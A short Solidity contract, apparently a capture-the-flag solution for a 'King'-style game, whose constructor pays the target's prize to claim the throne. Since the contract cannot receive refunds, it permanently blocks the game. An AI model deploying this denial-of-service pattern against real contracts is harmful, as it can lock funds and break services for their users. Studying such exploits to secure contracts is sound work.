// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface targetInterface {
    function prize() external returns (uint);
}

contract KingAttacker {
    constructor(address payable targetAddress) {
        targetInterface target = targetInterface(targetAddress);
        (bool success, ) = targetAddress.call{value: target.prize()}("");
        require(success);
    }
}
